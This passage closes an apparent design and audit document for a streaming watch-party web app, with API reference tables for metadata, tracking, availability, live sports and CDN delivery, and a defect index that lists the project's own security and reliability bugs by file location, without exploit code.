   frame-accurate room sync all work. Iframe sources get none of that, and room
   sync degrades to a full reload.
2. **Add the embed's origin to the CSP `frame-src`** in `backend/server.js` and
   to `TRUSTED_PLAYER_ORIGINS` in `frontend/src/player.js`, or it will be
   blocked and fail its handshake.

---

## Appendix A — API Reference

### Metadata
| API | Auth | Limits | Notes |
|-----|------|--------|-------|
| [TMDB](https://developer.themoviedb.org/docs) | Bearer | 50 req/s, 20 conns, **by IP not key** | Primary. Cache ≤6 months per ToS. |
| [AniList](https://anilist.gitbook.io/anilist-apiv2-docs/) | Optional OAuth | No strict enforcement | GraphQL, anime/manga. Best anime source. |
| [Jikan](https://jikan.moe/) | None | 429 on excess | REST wrapper on MAL. Use for MAL-style scores. |
| [TVmaze](https://www.tvmaze.com/api) | None | ~20 req/10s | Episode air dates, schedules. |
| [Fribb/anime-lists](https://github.com/Fribb/anime-lists) | None | — | ID mapping, self-updates 24h. **Mirror locally.** |
| [Otaku-Mappings](https://github.com/Goldenfreddy0703/Otaku-Mappings) | None | — | MAL/AniList/Kitsu/AniDB/SIMKL/TVDB/TMDB/IMDb/Trakt |
| [OpenSubtitles](https://opensubtitles.stoplight.io/) | API key | Tiered | Subtitles. |

### Tracking / Sync
| API | Notes |
|-----|-------|
| [Trakt](https://trakt.docs.apiary.io/) | Larger ecosystem, scrobbles from Plex/Kodi/Jellyfin. Anime filed under regular TV — messy for long series. |
| [Simkl](https://simkl.docs.apiary.io/) | Free open REST API. **Anime is a first-class pillar**, not bolted on. Better fit if anime matters to you. |

### Availability / Deep-links (Path A)
| API | Notes |
|-----|-------|
| [JustWatch GraphQL](https://apis.justwatch.com/docs/streaming_service/) | 200+ services, 50+ countries. Provider, format, price, **deeplink**. No key needed. Affiliate-monetisable. |
| Watchy | Commercial alternative, ~$16–100/mo. |

### Live / Sports
| API | Notes |
|-----|-------|
| [OpenF1](https://openf1.org/) | **Free, open-source, live F1 telemetry.** Your differentiator. |
| [Ergast](https://ergast.com/mrd/) | Historical F1. Non-commercial only. |
| [iptv-org](https://github.com/iptv-org/iptv) | 50k+ channels, strict legal inclusion criteria. Direct HLS. |
| API-Sports | Commercial, scores/fixtures/standings across sports. |

### Delivery (if you ever host video)
| Provider | Price | Notes |
|----------|-------|-------|
| Bunny CDN | ~$0.005–0.01/GB | Cheapest at scale; 119 PoPs / 77 countries |
| Cloudflare Stream | $5/1k min stored, $1/1k min delivered | Easiest — encoding + storage + ABR bundled |
| Mux | $0.07/min encode + $0.025/min deliver | Premium live + analytics; 5–8× the cost |

---

## Appendix B — Defect Index

| # | Severity | Location | Issue |
|---|----------|----------|-------|
| 1 | 🔴 | `scripts.js:898-909` | Stored XSS in room chat via `innerHTML` |
| 2 | 🔴 | `scripts.js:6` | TMDB token client-side + in git history (`04b2795`) |
| 3 | 🔴 | `routes/auth.js` | No rate limiting → credential stuffing |
| 4 | 🔴 | `scripts.js:473-491` | Single hardcoded source, no fallback ← **the main bug** |
| 5 | 🔴 | `scripts.js:517-527` | No embed failure detection |
| 6 | 🟠 | `scripts.js:529-551` | `postMessage` accepted from any origin |
| 7 | 🟠 | `server.js:67` | Room state in memory — lost on restart, breaks multi-instance |
| 8 | 🟠 | `server.js` socket handlers | No socket auth — anyone with a code controls the room |
| 9 | 🟠 | `scripts.js:78-99` | `Promise.all` → one failure blanks homepage |
| 10 | 🟠 | `scripts.js:36-38` | `tmdb()` returns error objects as data → `.map` crash |
| 11 | 🟠 | `scripts.js:166` | `buildHero` unguarded `.toFixed()` on possibly-undefined |
| 12 | 🟠 | git | `node_modules/` committed |
| 13 | 🟠 | `server.js:16,23` | CORS `*` on HTTP and WebSocket |
| 14 | 🟡 | `models/User.js:7-17` | Unbounded embedded watchlist array |
| 15 | 🟡 | `rooms.js:9` | 6-hex-char codes, collision → 500, no retry |
| 16 | 🟡 | `scripts.js:197` | Title interpolation into inline `onclick` |
| 17 | 🟡 | `scripts.js:264` | Watchlist re-add loses title/poster |
| 18 | 🟡 | `scripts.js:25` | `seriesLoaded` never resets |
| 19 | 🟡 | `auth.js:8` | Silent fallback JWT secret in prod |
| 20 | 🟡 | `scripts.js:529+` | Progress events received then discarded |

---

**Sources:** [AniList vs Jikan](https://taiga.moe/api.html) · [Jikan](https://jikan.moe/) · [Trakt vs Simkl](https://docs.simkl.org/how-to-use-simkl/faq/frequently-asked-questions/simkl-alternatives/simkl-vs-trakt) · [JustWatch API](https://apis.justwatch.com/docs/streaming_service/) · [iptv-org](https://github.com/iptv-org/iptv) · [OpenF1](https://openf1.org/) · [Ergast](https://ergast.com/mrd/) · [Fribb/anime-lists](https://github.com/Fribb/anime-lists) · [Otaku-Mappings](https://github.com/Goldenfreddy0703/Otaku-Mappings) · [TMDB rate limits](https://www.themoviedb.org/talk/6558fa627f054018d5168d91) · [hls.js best practices](https://ezwebtools.net/en/blog/hls-js-complete-guide-best-practices) · [LL-HLS/ABR tuning](https://blog.blazingcdn.com/en-us/cdn-stream-optimization-adaptive-bitrate-low-latency-hls) · [CDN pricing](https://www.pkgpulse.com/guides/mux-vs-cloudflare-stream-vs-bunny-stream-video-cdn-2026) · [Render cold starts + WebSockets](https://kuberns.com/blogs/deploy-nodejs-on-render/) · [Socket.IO Redis adapter](https://oneuptime.com/blog/post/2026-03-31-redis-nestjs-websocket-gateway-adapter/view) · [Hybrid recommenders](https://medium.com/codetodeploy/building-a-hybrid-recommendation-system-combining-collaborative-filtering-content-based-and-6be4e400ec3c) · [MongoDB recommendation engines](https://www.mongodb.com/resources/basics/artificial-intelligence/recommendation-engines) · [Cross-origin iframe detection](https://groups.google.com/a/chromium.org/g/chromium-discuss/c/Eu7cAXnHGD0)
